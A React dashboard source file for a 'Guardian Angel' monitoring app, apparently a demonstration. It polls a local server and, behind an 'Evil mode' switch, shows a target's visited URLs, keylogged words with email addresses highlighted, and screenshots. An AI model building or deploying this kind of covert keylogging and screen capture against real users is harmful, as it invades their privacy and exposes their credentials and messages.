"use client";
import styles from "./page.module.css";
import Tabs from "@mui/material/Tabs";
import Tab from "@mui/material/Tab";
import FormGroup from "@mui/material/FormGroup";
import FormControlLabel from "@mui/material/FormControlLabel";
import Switch from "@mui/material/Switch";

import { useState } from "react";
import { useInterval } from "../components/useInterval";

enum TabOptions {
  ReportedSites = "ReportedSites",
  KeyLogger = "KeyLogger",
  BehaviourTracking = "BehaviourTracking",
  Screenshot = "Screenshot",
}

type DataObject = {
  type: "screenshot" | "url" | "word" | "reportedSite";
  content: string;
};
export default function Home() {
  const [selectedTab, setSelectedTab] = useState<TabOptions>(
    TabOptions.ReportedSites
  );
  const [data, setData] = useState<DataObject[]>([]);
  const [isEvilMode, setIsEvilMode] = useState(false);

  const onEvilModeChanged = (
    event: React.SyntheticEvent,
    isChecked: boolean
  ): void => {
    setIsEvilMode(isChecked);
  };

  useInterval(() => {
    fetch("https://localhost:1111/data")
      .then((response) => response.json())
      .then((data) => setData(data));
  }, 5000);

  const handleChange = (event: React.SyntheticEvent, newValue: TabOptions) => {
    setSelectedTab(newValue);
  };

  const renderTabContent = (tab: TabOptions) => {
    if (tab === TabOptions.ReportedSites) {
      return (
        <div>
          <ul className={styles.reportedSitesList}>
            {data
              .filter((d) => d.type === "reportedSite")
              .map((d) => (
                <li key={d.content}>{d.content}</li>
              ))}
          </ul>
        </div>
      );
    }
    if (tab === TabOptions.BehaviourTracking) {
      return (
        <div>
          <ul className={styles.reportedSitesList}>
            {data
              .filter((d) => d.type === "url")
              .map((d) => (
                <li key={d.content}>{d.content}</li>
              ))}
          </ul>
        </div>
      );
    }
    if (tab === TabOptions.Screenshot) {
      return (
        <div>
          {data
            .filter((d) => d.type === "screenshot")
            .map((d) => (
              <img
                key={d.content}
                alt="screenshot"
                src={d.content}
                width="100%"
              />
            ))}
        </div>
      );
    }
    if (tab === TabOptions.KeyLogger) {
      return (
        <div className="words">
          {data
            .filter((d) => d.type === "word")
            .map((d) => (
              <div
                key={d.content + Math.random()}
                className={d.content.includes("@") ? styles.email : "regular"}
              >
                {d.content}
              </div>
            ))}
        </div>
      );
    }
  };
  return (
    <>
      <header className={styles.header}>
        <div className={styles.headerP}>
          <img src="/logo.svg" className={styles.headerImage} alt="logo" />
          <h2>Guardian Angel Dashboard</h2>
        </div>
        <img
          src="/UserIcon.svg"
          className={styles.headerImage}
          alt="user menu"
        />
      </header>
      <main className={styles.main}>
        {isEvilMode ? (
          <Tabs
            value={selectedTab}
            onChange={handleChange}
            aria-label="secondary tabs example"
          >
            <Tab value={TabOptions.ReportedSites} label="Reported Sites" />
            <Tab
              value={TabOptions.BehaviourTracking}
              label="Behaviour Tracking"
            />
            <Tab value={TabOptions.KeyLogger} label="Key Logger" />
            <Tab value={TabOptions.Screenshot} label="Screenshots" />
          </Tabs>
        ) : (
          <h2 className={styles.staticH2}>Reported Sites</h2>
        )}
        <div className={styles.contentArea}>
          {renderTabContent(selectedTab)}
        </div>
        <FormGroup>
          <FormControlLabel
            control={
              <Switch defaultChecked={false} onChange={onEvilModeChanged} />
            }
            label="Evil mode"
          />
        </FormGroup>
      </main>
    </>
  );
}
